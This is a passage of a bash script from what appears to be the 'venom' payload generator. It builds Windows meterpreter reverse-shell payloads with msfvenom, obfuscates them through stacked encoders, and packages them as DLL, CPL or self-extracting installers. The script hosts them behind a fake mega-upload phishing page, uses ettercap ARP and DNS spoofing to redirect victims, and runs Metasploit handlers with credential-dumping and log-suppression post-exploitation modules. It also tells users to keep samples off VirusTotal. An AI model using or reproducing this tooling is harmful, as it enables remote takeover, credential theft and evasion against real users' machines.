\"s|NaM3|$N4m2|g\" mega.html > copy.html\n      cp copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m2 $ApAcHe/$N4m2 > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m2|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m2 $ApAcHe/$N4m2\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            fi\n          fi\n\n\n        else\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n\n            if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            else\n              xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            fi\n          fi\n        fi\n   fi\n\n\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nmv $IPATH/templates/exec_dll[bak].c $InJEc5 > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm $IPATH/output/chars.raw > /dev/null 2>&1\nrm $IPATH/templates/copy.c > /dev/null 2>&1\nrm $IPATH/templates/copy2.c > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm $ApAcHe/$N4m.$Ext > /dev/null 2>&1\nrm $ApAcHe/$N4m2 > /dev/null 2>&1\nrm $ApAcHe/installer.bat > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nsleep 2\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_microsoft_menu\n  clear\nfi\n}\n\n\n\n\n\n# -------------------------------------------------\n# build shellcode in DLL format (windows-platforms)\n# and build installer.bat to use in winrar/sfx\n# 'make payload executable by pressing on it'\n# -------------------------------------------------\nsh_shellcode3 () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\n# input payload choise\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"windows/shell_bind_tcp\" FALSE \"windows/shell/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp_dns\" FALSE \"windows/meterpreter/reverse_http\" FALSE \"windows/meterpreter/reverse_https\" FALSE \"windows/x64/meterpreter/reverse_tcp\" FALSE \"windows/x64/meterpreter/reverse_https\" --width 350 --height 350) > /dev/null 2>&1\nN4m=$(zenity --title=\"☠ DLL NAME ☠\" --text \"example: DllExploit\" --entry --width 300) > /dev/null 2>&1\n# chose agent final extension (.dll or .cpl)\nExt=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable agent extensions:\\nThere is a niftty trick involving dll loading behavior under windows.\\nIf we rename our agent.dll to agent.cpl we now have an executable\\nmeterpreter payload that we cant doubleclick and launch it..\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"$N4m.dll\" FALSE \"$N4m.cpl\" --width 300 --height 150) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"DllExploit\";fi\nif [ \"$Ext\" = \"$N4m.dll\" ]; then\n   Ext=\"dll\"\nelse\n   Ext=\"cpl\"\nfi\n\n\necho \"[☠] Building shellcode -> dll format ...\"\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : DLL -> WINDOWS\n    PAYLOAD : $paylo\n\n!\n\n# use metasploit to build shellcode\n# new obfuscating method\nif [ \"$paylo\" = \"windows/x64/meterpreter/reverse_tcp\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f dll -o $IPATH/output/$N4m.dll\" > /dev/null 2>&1\nelse\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -a x86 -e x86/countdown -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 7 -f dll -o $IPATH/output/$N4m.dll\" > /dev/null 2>&1\nfi\necho \"\"\necho \"[☠] editing/backup files...\"\ncp $InJEc7 $IPATH/templates/hta_attack/index[bak].html\n\n\nif [ \"$Ext\" = \"dll\" ]; then\n  echo \"[☠] Injecting shellcode -> $N4m.dll!\"\n  sleep 2\n  # build winrar-SFX installer.bat script\n  echo \"[☠] Building winrar/SFX -> installer.bat...\"\n  sleep 2\n  echo \":: SFX auxiliary | Author: r00t-3xp10it\" > $IPATH/output/installer.bat\n  echo \":: this script will run payload using rundll32\" >> $IPATH/output/installer.bat\n  echo \":: ---\" >> $IPATH/output/installer.bat\n  echo \"@echo off\" >> $IPATH/output/installer.bat\n  echo \"echo [*] Please wait, preparing software ...\" >> $IPATH/output/installer.bat\n  echo \"rundll32.exe $N4m.dll,main\" >> $IPATH/output/installer.bat\n  echo \"exit\" >> $IPATH/output/installer.bat\n  sleep 2\nelse\n  echo \"[☠] Injecting shellcode -> $N4m.$Ext!\"\n  sleep 2\n  mv $IPATH/output/$N4m.dll $IPATH/output/$N4m.$Ext\nfi\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nif [ \"$Ext\" = \"dll\" ]; then\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.dll\\n$IPATH/output/installer.bat\\n\\nExecute on cmd: rundll32.exe $N4m.dll,main\\n\\nchose how to deliver: $N4m.dll\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 260) > /dev/null 2>&1\nelse\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.cpl\\n\\nchose how to deliver: $N4m.cpl\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 260) > /dev/null 2>&1\nfi\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log;  use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n        fi\n      sleep 2\n\n\n   else\n\n\n      if [ \"$Ext\" = \"dll\" ]; then\n      N4m2=$(zenity --title=\"☠ SFX Infection ☠\" --text \"WARNING BEFORE CLOSING THIS BOX:\\n\\nTo use SFX attack vector: $N4m.dll needs to be\\ncompressed together with installer.bat into one SFX\\n\\n1º compress the two files into one SFX\\n2º store SFX into shell/output folder\\n3º write the name of the SFX file\\n4º press OK to continue...\\n\\nExample:output.exe\" --entry --width 360) > /dev/null 2>&1\n      else\n      N4m2=\"$N4m.$Ext\"\n      fi\n\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 310) > /dev/null 2>&1\n\n\n\n\nif [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\nfi\n\n\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m2|g\" mega.html > copy.html\n      cp copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m2 $ApAcHe/$N4m2 > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m2|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m2 $ApAcHe/$N4m2\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n        else\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n          fi\n        fi\n   fi\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm $ApAcHe/$N4m.$Ext > /dev/null 2>&1\nrm $ApAcHe/$N4m2 > /dev/null 2>&1\nrm $ApAcHe/installer.bat > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\ncd $IPATH\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_microsoft_menu\n  clear\nfi\n}\n\n\n\n\n\n# -------------------------------------------------------------\n# build shellcode in PYTHON/EXE format (windows)\n# 1º option: build default shellcode (my-way)\n# 2º veil-evasion python -> pyherion (reproduction)\n# 3º use pyinstaller by:david cortesi to compile python-to-exe\n# 4º use NXcrypt to insert junk into sourcecode (obfuscation)\n# -------------------------------------------------------------\nsh_shellcode4 () {\n# get user input to build shellcode (python)\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\n\n# input payload choise\npaylo=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\nAvailable Payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"windows/shell_bind_tcp\" FALSE \"windows/shell/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp\" FALSE \"windows/meterpreter/reverse_tcp_dns\" FALSE \"windows/meterpreter/reverse_http\" FALSE \"windows/meterpreter/reverse_https\" FALSE \"windows/meterpreter/reverse_winhttps\" FALSE \"windows/x64/meterpreter/reverse_tcp\" FALSE \"windows/x64/meterpreter/reverse_https\" --width 370 --height 350) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ PAYLOAD NAME ☠\" --text \"Enter payload output name\\nexample: shellcode\" --width 300) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"shellcode\";fi\n\necho \"[☠] Building shellcode -> C format ...\"\nsleep 2\nif [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n   echo \"[☠] meterpreter over SSL sellected ..\";sleep 1\nfi\n\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : C -> WINDOWS\n    PAYLOAD : $paylo\n\n!\n\n# use metasploit to build shellcode\nif [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f C > $IPATH/output/chars.raw\"\nelse\n   xterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw\"\nfi\n\necho \"\"\n# display generated shelcode\ncat $IPATH/output/chars.raw\necho \"\" && echo \"\"\nsleep 2\n\n   # check if all dependencies needed are installed\n   # check if template exists (exec.py)\n   if [ -e $InJEc2 ]; then\n      echo \"[☠] exec.py -> found!\"\n      sleep 2\n   else\n      echo \"[☠] exec.py -> not found!\"\n      exit\n   fi\n\n   # check if chars.raw as generated\n   if [ -e $Ch4Rs ]; then\n      echo \"[☠] chars.raw -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] chars.raw -> not found!\"\n      exit\n      fi\n\n# EDITING/BACKUP FILES NEEDED\necho \"[☠] editing/backup files...\"\ncp $InJEc2 $IPATH/templates/exec[bak].py\n\n\n   # edit exec.py using leafpad or gedit editor\n   if [ \"$DiStR0\" = \"Kali\" ]; then\n      leafpad $InJEc2 > /dev/null 2>&1\n   else\n      gedit $InJEc2 > /dev/null 2>&1\n   fi\n\n# move 'compiled' shellcode to output folder\nmv $IPATH/templates/exec.py $IPATH/output/$N4m.py\nchmod +x $IPATH/output/$N4m.py\n\n\n\n# -----------------------------------------\n# chose what to do with generated shellcode\n# -----------------------------------------\nans=$(zenity --list --title \"☠ EXECUTABLE FORMAT ☠\" --text \"\\nChose what to do with: $N4m.py\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"default ($N4m.py) python\" FALSE \"pyherion ($N4m.py) obfuscated\" FALSE \"NXcrypt ($N4m.py) obfuscated\" FALSE \"pyinstaller ($N4m.exe) executable\" --width 340 --height 240) > /dev/null 2>&1\n\n\n   if [ \"$ans\" \"=\" \"default ($N4m.py) python\" ]; then\n     zenity --title=\"☠ PYTHON OUTPUT ☠\" --text \"PAYLOAD STORED UNDER:\\n$IPATH/output/$N4m.py\" --info --width 300 > /dev/null 2>&1\n     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n     echo \"[☠] Start a multi-handler...\"\n     echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n     echo \"[☯] Please dont test samples on virus total...\"\n       if [ \"$MsFlF\" = \"ON\" ]; then\n\n         if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n           xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n         else\n         xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n         fi\n\n         cd $IPATH/output\n         # delete utf-8/non-ancii caracters from output\n         tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n         sed -i \"s/\\[0m//g\" final.log\n         sed -i \"s/\\[1m\\[34m//g\" final.log\n         sed -i \"s/\\[4m//g\" final.log\n         sed -i \"s/\\[K//g\" final.log\n         sed -i \"s/\\[1m\\[31m//g\" final.log\n         sed -i \"s/\\[1m\\[32m//g\" final.log\n         sed -i \"s/\\[1m\\[33m//g\" final.log\n         mv final.log $N4m-$lhost.log > /dev/null 2>&1\n         rm report.log > /dev/null 2>&1\n         cd $IPATH/\n       else\n\n         if [ \"$paylo\" = \"windows/meterpreter/reverse_winhttps\" ] || [ \"$paylo\" = \"windows/meterpreter/reverse_https\" ] || [ \"$paylo\" = \"windows/x64/meterpreter/reverse_https\" ]; then\n           xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'\"\n         else\n         xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'\"\n         fi\n       fi\n\n\n\n     # CLEANING EVERYTHING UP\n     echo \"[☠] Cleanning temp generated files...\"\n     mv $IPATH/templates/exec[bak].py $InJEc2\n     rm $IPATH/output/chars.raw > /dev/null 2>&1\n     cd $IPATH/\n     sleep 2\n     clear\n\n\n   elif [ \"$ans\" \"=\" \"pyherion ($N4m.py) obfuscated\" ]; then\n     cd $IPATH/obfuscate\n     # obfuscating payload (pyherion.py)\n     echo \"[☠] pyherion -> encrypting...\"\n     sleep 2\n     echo \"[☠] base64+AES encoded -> $N4m.py!\"\n     sleep 2\n     sudo ./pyherion.py $IPATH/output/$N4m.py $IPATH/output/$N4m.py > /dev/null 2>&1\n     zenity --title=\"☠ PYTHON OUTPUT ☠\" --text \"PAYLOAD STORED UNDER:\\n$IPATH/output/$N4m.py\" --info --width 300 > /dev/null 2>&1\n     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n     echo \"[☠] Start a multi-handler...\"\n    